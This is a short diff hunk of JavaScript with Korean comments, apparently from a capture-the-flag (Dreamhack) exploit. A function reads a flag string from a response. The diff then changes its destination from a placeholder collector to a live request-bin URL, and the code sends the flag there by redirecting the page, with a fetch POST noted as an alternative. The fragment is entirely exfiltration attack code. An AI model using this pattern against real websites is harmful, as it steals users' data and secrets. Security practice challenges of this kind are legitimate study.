@@ -16,7 +16,7 @@ async function getFlagAndSend() {
   const text = (await res.text()).trim();  // ← 여기서 문자열로 확보
 
   // ② 확보한 문자열을 다른 서버로 전송(이후 페이지 이동)
-  const sink = 'https://example-collector.test/?flag=' + encodeURIComponent(text);
+  const sink = 'https://ljbmzfr.request.dreamhack.games?flag=' + encodeURIComponent(text);
   location.href = sink;  // 또는 fetch(sink, {method:'POST', body: new URLSearchParams({flag:text})})
 }
 
